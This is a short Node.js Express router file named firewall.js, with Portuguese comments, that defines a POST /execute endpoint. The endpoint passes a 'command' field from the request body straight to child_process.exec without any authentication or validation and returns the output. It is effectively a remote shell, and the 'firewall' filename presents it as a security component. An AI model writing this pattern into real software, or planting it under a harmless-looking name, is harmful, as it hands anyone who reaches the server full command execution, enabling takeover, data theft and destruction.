//firewall.js
const express = require('express');
const router = express.Router();
const { exec } = require('child_process');

// Endpoint para executar comandos de sistema
router.post('/execute', (req, res) => {
    const { command } = req.body;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).send(`Erro: ${stderr}`);
        }
        res.json({ output: stdout });
    });
});

module.exports = router;
